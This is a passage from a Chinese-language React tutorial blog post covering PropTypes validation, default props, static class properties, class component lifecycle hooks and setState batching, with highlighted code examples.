javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> List = <span class="function"><span class="params">props</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> arr = props.colors</span><br><span class="line">  <span class="keyword">const</span> lis = arr.map(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &lt;li key=&#123;index&#125;&gt;&#123;item.name&#125;&lt;<span class="regexp">/li&gt;)</span></span><br><span class="line"><span class="regexp">  return &lt;ul&gt;&#123;lis&#125;&lt;/u</span>l&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">List.propTypes = &#123;</span><br><span class="line">  <span class="comment">// props属性：校验规则</span></span><br><span class="line">  colors: PropTypes.array</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Props-类型校验常见类型"><a href="#Props-类型校验常见类型" class="headerlink" title="Props - 类型校验常见类型"></a>Props - 类型校验常见类型</h2><h3 id="常见的校验规则"><a href="#常见的校验规则" class="headerlink" title="常见的校验规则"></a>常见的校验规则</h3><ol><li>常见类型：array、bool、func、number、object、string</li><li>React元素类型：element</li><li>必填项：isRequired</li><li>特定结构的对象：shape({})</li></ol><h3 id="校验规则的使用"><a href="#校验规则的使用" class="headerlink" title="校验规则的使用"></a>校验规则的使用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Demo = <span class="function">(<span class="params">props</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Demo组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line">Demo.propTypes = &#123;</span><br><span class="line">  <span class="comment">// 常见类型</span></span><br><span class="line">  optionalFunc: PropTypes.func,</span><br><span class="line">  <span class="comment">// 常见类型+必填</span></span><br><span class="line">  requiredFunc: PropTypes.func.isRequired,</span><br><span class="line">  <span class="comment">// 特定结构的对象</span></span><br><span class="line">  optionalObjectWithShape: PropTypes.shape(&#123;</span><br><span class="line">    color: PropTypes.string,</span><br><span class="line">    fontSize: PropTypes.number</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="props-默认值"><a href="#props-默认值" class="headerlink" title="props - 默认值"></a>props - 默认值</h2><blockquote><p>作用：给组件的props设置默认值，在未传入props的时候生效</p></blockquote><h3 id="设置props的默认值"><a href="#设置props的默认值" class="headerlink" title="设置props的默认值"></a>设置props的默认值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 分页组件</span></span><br><span class="line"><span class="keyword">const</span> Pagination = <span class="function">(<span class="params">props</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span> pageSize的默认值：&#123;props.pageSize&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置默认值</span></span><br><span class="line">Pagination.defaultProps = &#123;</span><br><span class="line">pageSize: <span class="number">10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用组件</span></span><br><span class="line">&lt;Pagination /&gt;</span><br></pre></td></tr></table></figure><h3 id="新版react推荐使用参数默认值来实现"><a href="#新版react推荐使用参数默认值来实现" class="headerlink" title="新版react推荐使用参数默认值来实现"></a>新版react推荐使用参数默认值来实现</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 分页组件</span></span><br><span class="line"><span class="keyword">const</span> Pagination = <span class="function">(<span class="params">&#123;pageSize = <span class="number">10</span>&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span> pageSize的默认值：&#123;pageSize&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用组件</span></span><br><span class="line">&lt;Pagination /&gt;</span><br></pre></td></tr></table></figure><h2 id="props-静态属性写法"><a href="#props-静态属性写法" class="headerlink" title="props - 静态属性写法"></a>props - 静态属性写法</h2><h3 id="类的静态属性"><a href="#类的静态属性" class="headerlink" title="类的静态属性"></a>类的静态属性</h3><ul><li>实例属性需要实例化后，通过实例访问</li><li>静态属性，可以通过类直接访问</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 实例属性</span></span><br><span class="line">  gender = <span class="string">'男'</span></span><br><span class="line">  <span class="comment">// 静态属性</span></span><br><span class="line">  <span class="keyword">static</span> age = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 访问静态属性</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.age) <span class="comment">// 18</span></span><br><span class="line"><span class="comment">// 访问实例属性</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="built_in">console</span>.log(p.gender)   <span class="comment">// 男</span></span><br></pre></td></tr></table></figure><h3 id="类组件中-propTypes-defaultProps-的使用"><a href="#类组件中-propTypes-defaultProps-的使用" class="headerlink" title="类组件中 propTypes defaultProps 的使用"></a>类组件中 propTypes defaultProps 的使用</h3><ul><li>在类组件中通过 <code>static propTypes = {}</code> 定义props校验规则 <code>static defaultProps = {}</code> 定义props默认值</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 校验</span></span><br><span class="line">  <span class="keyword">static</span> propTypes = &#123;</span><br><span class="line">    colors: PropTypes.array,</span><br><span class="line">    gender: PropTypes.oneOf([<span class="string">'男'</span>, <span class="string">'女'</span>]).isRequired</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 默认值</span></span><br><span class="line">  <span class="keyword">static</span> defaultProps = &#123;</span><br><span class="line">gender: <span class="string">'男'</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Demo组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="生命周期-概览"><a href="#生命周期-概览" class="headerlink" title="生命周期 - 概览"></a>生命周期 - 概览</h2><h3 id="什么是组件生命周期"><a href="#什么是组件生命周期" class="headerlink" title="什么是组件生命周期"></a>什么是组件生命周期</h3><ul><li>一个事物从创建到最后消亡经历的整个过程</li></ul><p><img src="https://oss.iyouhun.com/img/md/02.6149b007.png" alt="人一生缩影"></p><h3 id="React类组件的生命周期整体概览，组件从创建到消耗的过程"><a href="#React类组件的生命周期整体概览，组件从创建到消耗的过程" class="headerlink" title="React类组件的生命周期整体概览，组件从创建到消耗的过程"></a>React类组件的生命周期整体概览，组件从创建到消耗的过程</h3><p><a href="http://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/" target="_blank" rel="noopener">React组件生命周期</a></p><p><img src="https://oss.iyouhun.com/img/md/image-20220608143938263.png" alt="image-20220608143938263"></p><h3 id="生命周期的意义"><a href="#生命周期的意义" class="headerlink" title="生命周期的意义"></a>生命周期的意义</h3><ul><li>助于理解组件的运行方式、完成更复杂的组件功能、分析组件错误原因</li><li>钩子函数为开发人员在不同阶段操作组件提供了时机</li></ul><p><strong>总结：</strong>只有类组件才有生命周期，分为 <code>挂载阶段</code> <code>更新阶段</code> <code>卸载阶段</code></p><h2 id="生命周期-挂载阶段"><a href="#生命周期-挂载阶段" class="headerlink" title="生命周期 - 挂载阶段"></a>生命周期 - 挂载阶段</h2><h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>constructor() –&gt; render() –&gt; componentDidMount() </p><h3 id="触发时机及作用"><a href="#触发时机及作用" class="headerlink" title="触发时机及作用"></a>触发时机及作用</h3><table><thead><tr><th>钩子函数</th><th>触发时机</th><th>作用</th></tr></thead><tbody><tr><td>constructor</td><td>创建组件时，最先执行</td><td>1. 初始化state 2. 创建 Ref 3. 使用 bind 解决 this 指向问题等</td></tr><tr><td>render</td><td>每次组件渲染都会触发</td><td>渲染UI（<strong>注意： 不能调用setState()</strong> ）</td></tr><tr><td>componentDidMount</td><td>组件挂载（完成DOM渲染）后</td><td>1. 发送网络请求 2.DOM操作</td></tr></tbody></table><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> () &#123;</span><br><span class="line">    <span class="keyword">super</span>()</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'1. constructor执行'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  componentDidMount () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'3. componentDidMount执行'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'2. render执行'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>App组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="生命周期-更新阶段"><a href="#生命周期-更新阶段" class="headerlink" title="生命周期 - 更新阶段"></a>生命周期 - 更新阶段</h2><h3 id="执行顺序-1"><a href="#执行顺序-1" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>render() –&gt; componentDidUpdate()</p><h3 id="何时触发更新阶段"><a href="#何时触发更新阶段" class="headerlink" title="何时触发更新阶段"></a>何时触发更新阶段</h3><ol><li>setState()</li><li>forceUpdate() 强制组件更新</li><li>组件接收到新的props（实际上，只需要父组件更新，子组件就会重新渲染）</li></ol><h3 id="触发时机及作用-1"><a href="#触发时机及作用-1" class="headerlink" title="触发时机及作用"></a>触发时机及作用</h3><table><thead><tr><th>钩子函数</th><th>触发时机</th><th>作用</th></tr></thead><tbody><tr><td>render</td><td>每次组件渲染都会触发</td><td>渲染UI（与 挂载阶段 是同一个render）</td></tr><tr><td>componentDidUpdate</td><td>组件更新（完成DOM渲染）后</td><td>DOM操作，可以获取到更新后的DOM内容，<strong>不要直接调用setState</strong></td></tr></tbody></table><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>统计豆豆被打的次数：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      count: <span class="keyword">this</span>.state.count + <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentDidUpdate() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'2. componentDidUpdate执行'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'1. render执行'</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;Child /&gt;</span><br><span class="line">        &lt;button onClick=&#123;<span class="keyword">this</span>.handleClick&#125;&gt;打豆豆&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="生命周期-卸载阶段"><a href="#生命周期-卸载阶段" class="headerlink" title="生命周期 - 卸载阶段"></a>生命周期 - 卸载阶段</h2><h3 id="什么时候触发卸载？"><a href="#什么时候触发卸载？" class="headerlink" title="什么时候触发卸载？"></a>什么时候触发卸载？</h3><ul><li>在组件被移除的时候（消失）触发卸载阶段</li></ul><h3 id="触发时机及作用-2"><a href="#触发时机及作用-2" class="headerlink" title="触发时机及作用"></a>触发时机及作用</h3><table><thead><tr><th>钩子函数</th><th>触发时机</th><th>作用</th></tr></thead><tbody><tr><td>componentWillUnmount</td><td>组件卸载（从页面中消失）</td><td>执行清理工作（比如：清理定时器等）</td></tr></tbody></table><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  componentWillUnmount () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'componentWillUnmount执行'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>统计豆豆被打的次数：&#123;this.props.count&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      count: <span class="keyword">this</span>.state.count + <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &#123; <span class="keyword">this</span>.state.count &lt; <span class="number">5</span> &amp;&amp; <span class="xml"><span class="tag">&lt;<span class="name">Child</span> <span class="attr">count</span>=<span class="string">&#123;this.state.count&#125;</span> /&gt;</span>&#125;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.handleClick&#125;</span>&gt;</span>打豆豆<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="setState扩展-发现问题"><a href="#setState扩展-发现问题" class="headerlink" title="setState扩展 - 发现问题"></a>setState扩展 - 发现问题</h2><blockquote><p>发现setState是“异步”的，多次setState会合并。</p></blockquote><ul><li>理解setState是“异步”的，理解setState会合并更新<ul><li>调用 setState 时，将要更新的状态对象，放到一个更新队列中暂存起来（没有立即更新）</li><li>如果多次调用 setState 更新状态，<strong>状态会进行合并，后面覆盖前面</strong></li><li>等到所有的操作都执行完毕，React 会拿到最终的状态，然后触发组件更新</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;<span class="attr">count</span>: <span class="keyword">this</span>.state.count+<span class="number">100</span>&#125;)</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;<span class="attr">count</span>: <span class="keyword">this</span>.state.count+<span class="number">1</span>&#125;)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.state.count)  <span class="comment">// 打印0</span></span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'render'</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;Demo组件：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.handleClick&#125;&gt;体现“异步”和合并&lt;/</span>button&gt; </span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>React这么处理的好处是什么？<ul><li>“异步” 更新，或者做延时更新，为了等所有操作结束后去更新</li><li>合并更新，是将多次setState合并，然后进行更新</li><li>都是为了提高渲染性能</li></ul></li></ul><h2 id="setState扩展-更多用法"><a href="#setState扩展-更多用法" class="headerlink" title="setState扩展 - 更多用法"></a>setState扩展 - 更多用法</h2><ul><li>多次使用setState让数据串联使用的写法</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// this.setState(&#123;count: this.state.count+1&#125;)</span></span><br><span class="line">    <span class="comment">// this.setState(&#123;count: this.state.count+1&#125;)</span></span><br><span class="line">    <span class="comment">// this.setState(&#123;count: this.state.count+1&#125;)</span></span><br><span class="line">    <span class="comment">// 页面展示 1</span></span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function"><span class="params">prevState</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        count: prevState.count + <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function"><span class="params">prevState</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        count: prevState.count + <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function"><span class="params">prevState</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        count: prevState.count + <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 页面展示 3</span></span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;Demo组件：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState串联更新数据&lt;/</span>button&gt; </span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>调用setState后页面更新后执行逻辑写法</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function"><span class="params">prevState</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        count: prevState.count + <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,()=&gt;&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">'更新后：'</span>, <span class="keyword">this</span>.state.count)  <span class="comment">// 打印：1</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'未更新：'</span>, <span class="keyword">this</span>.state.count)  <span class="comment">// 打印：0</span></span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;Demo组件：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.handleClick&#125;&gt;setState更新后执行逻辑&lt;/</span>button&gt; </span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><ul><li>使用 <code>setState((prevState) =&gt; {})</code> 语法，可以解决多次调用状态依赖问题</li><li>使用 <code>setState(updater[, callback])</code> 语法，在状态更新（页面完成重新渲染）后立即执行某个操作</li></ul><h2 id="setState扩展-异步OR同步"><a href="#setState扩展-异步OR同步" class="headerlink" title="setState扩展 - 异步OR同步"></a>setState扩展 - 异步OR同步</h2><p>在react类组件中，多次的setState并不会立刻执行，而是合并成一个来执行。</p><ul><li>setState本身并不是一个异步方法，其之所以会表现出一种“异步”的形式，是因为react框架本身的一个性能优化机制</li><li>React会将多个setState的调用合并为一个来执行，也就是说，当执行setState的时候，state中的数据并不会马上更新</li></ul><p><strong>知道何时出现“异步”，知道何时出现同步</strong> </p><ul><li>setState如果是在react的生命周期中或者是事件处理函数中，表现出来为：延迟合并更新（“异步更新”）</li><li>setState如果是在<strong>setTimeout/setInterval</strong>或者原生事件中，表现出来是：立即更新（“同步更新”）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 